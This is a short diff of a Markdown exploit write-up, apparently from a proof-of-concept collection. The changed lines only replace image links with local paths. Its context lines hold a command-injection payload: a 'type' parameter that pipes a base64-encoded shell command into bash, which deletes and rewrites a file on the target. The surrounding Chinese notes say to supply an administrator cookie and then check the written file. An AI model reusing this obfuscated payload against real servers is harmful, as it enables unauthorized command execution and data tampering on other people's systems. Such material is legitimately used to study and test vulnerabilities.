@@ -31,11 +31,11 @@ Accept-Encoding: gzip
 
 type=%7Cbash+-c+%27echo+cm0gLXJmIC4uLzEyMzMyMXF3ZS50eHQgJiYgZWNobyBGMDhiYmZiMkJDOGNlZUQ2ID4gLi4vMTIzMzIxcXdlLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27
 ```
-![image](https://github.com/wy876/POC/assets/139549762/a4710fcd-de46-4774-8c69-de8f5a74dcb2)
+![image](../../images/a4710fcd-de46-4774-8c69-de8f5a74dcb2.png)
 
 把管理员cookie填进去，然后写入文件
 
-![c534bc92b717fb16aafc3f62f07e90b1](https://github.com/wy876/POC/assets/139549762/2c93d83a-6e44-4198-b973-271829bca4fa)
+![c534bc92b717fb16aafc3f62f07e90b1](../../images/2c93d83a-6e44-4198-b973-271829bca4fa.png)
 
 文件路径`http://127.0.0.1/123321qwe.txt`
 
